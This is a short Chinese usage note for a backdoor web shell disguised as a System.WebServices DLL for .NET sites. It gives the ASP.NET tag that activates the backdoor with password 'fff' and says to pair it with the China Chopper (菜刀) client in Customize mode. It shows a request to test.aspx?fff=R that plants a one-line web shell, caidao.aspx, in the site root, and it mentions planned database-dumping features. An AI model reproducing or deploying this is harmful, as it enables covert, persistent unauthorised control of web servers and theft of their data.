使用方法：
<% WebServices.InitalizeWebServices("fff") %>
或<% WebServices.InitalizeWebServices("fff"); %>
看环境使用上面两种，有的环境下期中一种会报错，就使用另外一种，至少我两个类型都遇到报错的问题，换下就可以了。
菜刀选Customize
fff是密码，自己修改就可以了。

System.WebServices原版.dll
是原来作者提供的，如有需要可以使用。原版兼容性可能会比较好。

最近修复：
1.修复报错BUG；
2.添加自动写.net一句话的参数，使用例子：
http://192.168.153.133:81/test.aspx?fff=R
fff为你的密码，按上面的例子提交一个请求，如果页面返回OK，则成功在网站根目录生成一个密码为test的caidao.aspx；


后续考虑加下拖库的功能，直接写到文件，jsp的Customize_shell有人已经写这个功能来了出来了，以后可以参考。